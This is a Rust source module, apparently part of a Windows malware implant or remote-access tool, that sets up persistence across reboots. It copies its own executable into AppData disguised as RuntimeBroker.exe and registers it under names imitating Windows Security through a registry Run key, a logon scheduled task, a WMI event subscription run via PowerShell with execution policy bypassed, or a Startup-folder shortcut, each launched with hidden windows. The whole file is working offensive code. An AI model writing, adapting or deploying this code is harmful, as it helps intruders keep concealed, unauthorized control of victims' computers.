//! Persistence module for Windows systems.
//!
//! This module implements multiple persistence mechanisms to maintain
//! access across system reboots and logoff/logon cycles.

#[cfg(target_os = "windows")]
use std::process::Command;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
use std::env;

/// Available persistence methods
#[derive(Debug, Clone, Copy)]
pub enum PersistenceMethod {
    RegistryRun,
    ScheduledTask,
    WmiEvent,
    StartupFolder,
}

impl PersistenceMethod {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
            "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
            "wmi" => Some(PersistenceMethod::WmiEvent),
            "startup" => Some(PersistenceMethod::StartupFolder),
            _ => None,
        }
    }
}

/// Copia el ejecutable a una ubicación fija en AppData
#[cfg(target_os = "windows")]
fn copy_to_appdata() -> Result<String, String> {
    use std::fs;
    use std::io::{Read, Write};
    
    let current_exe = env::current_exe()
        .map_err(|e| format!("Error exe: {}", e))?;
    
    let localappdata = env::var("LOCALAPPDATA")
        .unwrap_or_else(|_| "C:\\Users\\Public\\AppData\\Local".to_string());
    
    let target_dir = format!("{}\\Microsoft\\WindowsApps", localappdata);
    let target_path = format!("{}\\RuntimeBroker.exe", target_dir);
    
    // Crear directorio
    let _ = fs::create_dir_all(&target_dir);
    
    // Si ya existe con el mismo tamaño, usarlo
    if let Ok(target_meta) = fs::metadata(&target_path) {
        if let Ok(current_meta) = fs::metadata(&current_exe) {
            if target_meta.len() == current_meta.len() {
                return Ok(target_path);
            }
        }
    }
    
    // Copiar
    let mut src = fs::File::open(&current_exe)
        .map_err(|e| format!("Error open: {}", e))?;
    let mut dst = fs::File::create(&target_path)
        .map_err(|e| format!("Error create: {}", e))?;
    
    let mut buf = vec![0u8; 65536];
    loop {
        let n = src.read(&mut buf).map_err(|e| format!("Read: {}", e))?;
        if n == 0 { break; }
        dst.write_all(&buf[..n]).map_err(|e| format!("Write: {}", e))?;
    }
    
    Ok(target_path)
}

/// Registry Run persistence
#[cfg(target_os = "windows")]
fn persist_registry(exe_path: &str) -> Result<String, String> {
    let name = "WindowsSecurityHealth";
    let value = format!("\"{}\"", exe_path);
    
    let out = Command::new("reg")
        .args(&["add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", name, "/t", "REG_SZ", "/d", &value, "/f"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Error: {}", e))?;
    
    if out.status.success() {
        Ok(format!("Registry: {} -> {}", name, exe_path))
    } else {
        Err(format!("Error: {}", String::from_utf8_lossy(&out.stderr).trim()))
    }
}

/// Scheduled Task persistence
#[cfg(target_os = "windows")]
fn persist_task(exe_path: &str) -> Result<String, String> {
    let name = "WindowsSecurityHealthService";
    
    // Eliminar si existe
    let _ = Command::new("schtasks")
        .args(&["/Delete", "/TN", name, "/F"])
        .creation_flags(0x08000000)
        .output();
    
    let out = Command::new("schtasks")
        .args(&["/Create", "/SC", "ONLOGON", "/TN", name, "/TR", exe_path, "/F"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Error: {}", e))?;
    
    if out.status.success() {
        Ok(format!("Task: {} -> {}", name, exe_path))
    } else {
        Err(format!("Error: {}", String::from_utf8_lossy(&out.stderr).trim()))
    }
}

/// WMI Event persistence
#[cfg(target_os = "windows")]
fn persist_wmi(exe_path: &str) -> Result<String, String> {
    let filter = "WinSecFilter";
    let consumer = "WinSecConsumer";
    
    // Escapar ruta para PowerShell
    let exe_escaped = exe_path.replace("\\", "\\\\");
    
    let script = format!(r#"
$ErrorActionPreference = 'Stop'
try {{
    # Limpiar
    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{0}'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{1}'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue | Where-Object {{ $_.Filter -like "*{0}*" }} | Remove-WmiObject -EA SilentlyContinue
    
    # Filter
    $F = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{{
        Name = '{0}'
        EventNamespace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"
    }}
    
    # Consumer
    $C = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{{
        Name = '{1}'
        CommandLineTemplate = '{2}'
    }}
    
    # Binding
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{{
        Filter = $F
        Consumer = $C
    }} | Out-Null
    
    'OK'
}} catch {{
    throw $_.Exception.Message
}}
"#, filter, consumer, exe_escaped);

    let out = Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", &script])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Error: {}", e))?;
    
    let stdout = String::from_utf8_lossy(&out.stdout);
    let stderr = String::from_utf8_lossy(&out.stderr);
    
    if stdout.trim() == "OK" {
        Ok(format!("WMI: {} -> {}", filter, exe_path))
    } else if !stderr.is_empty() {
        Err(format!("Error: {}", stderr.trim()))
    } else {
        Err("Error WMI desconocido".to_string())
    }
}

/// Startup Folder persistence
#[cfg(target_os = "windows")]
fn persist_startup(exe_path: &str) -> Result<String, String> {
    let startup = env::var("APPDATA")
        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", p))
        .unwrap_or_else(|_| "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".to_string());
    
    let lnk = format!("{}\\WindowsSecurity.lnk", startup);
    
    let script = format!(
        r#"$s = (New-Object -ComObject WScript.Shell).CreateShortcut('{}'); $s.TargetPath = '{}'; $s.WindowStyle = 7; $s.Save()"#,
        lnk.replace("'", "''"), exe_path.replace("'", "''")
    );
    
    let out = Command::new("powershell")
        .args(&["-NoProfile", "-Command", &script])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| format!("Error: {}", e))?;
    
    if out.status.success() {
        Ok(format!("Startup: {}", lnk))
    } else {
        Err(format!("Error: {}", String::from_utf8_lossy(&out.stderr).trim()))
    }
}

/// Establece persistencia
pub fn establish_persistence(method: PersistenceMethod) -> Result<String, String> {
    #[cfg(not(target_os = "windows"))]
    {
        return Err("Solo Windows".to_string());
    }
    
    #[cfg(target_os = "windows")]
    {
        // Copiar a ubicación persistente
        let exe_path = copy_to_appdata()?;
        
        match method {
            PersistenceMethod::RegistryRun => persist_registry(&exe_path),
            PersistenceMethod::ScheduledTask => persist_task(&exe_path),
            PersistenceMethod::WmiEvent => persist_wmi(&exe_path),
            PersistenceMethod::StartupFolder => persist_startup(&exe_path),
        }
    }
}

/// Remueve la persistencia
#[cfg(target_os = "windows")]
pub fn remove_persistence() -> Result<String, String> {
    // Registry
    let _ = Command::new("reg")
        .args(&["delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "WindowsSecurityHealth", "/f"])
        .creation_flags(0x08000000)
        .output();
    
    // Task
    let _ = Command::new("schtasks")
        .args(&["/Delete", "/TN", "WindowsSecurityHealthService", "/F"])
        .creation_flags(0x08000000)
        .output();
    
    // WMI
    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-Command", r#"
            Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WinSecFilter'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
            Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WinSecConsumer'" -EA SilentlyContinue | Remove-WmiObject -EA SilentlyContinue
            Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -EA SilentlyContinue | Where-Object { $_.Filter -like "*WinSecFilter*" } | Remove-WmiObject -EA SilentlyContinue
        "#])
        .creation_flags(0x08000000)
        .output();
    
    // Startup shortcut
    let startup = env::var("APPDATA")
        .map(|p| format!("{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.lnk", p))
        .unwrap_or_default();
    let _ = std::fs::remove_file(&startup);
    
    Ok("Persistencia removida".to_string())
}

#[cfg(not(target_os = "windows"))]
pub fn remove_persistence() -> Result<String, String> {
    Err("Solo Windows".to_string())
}
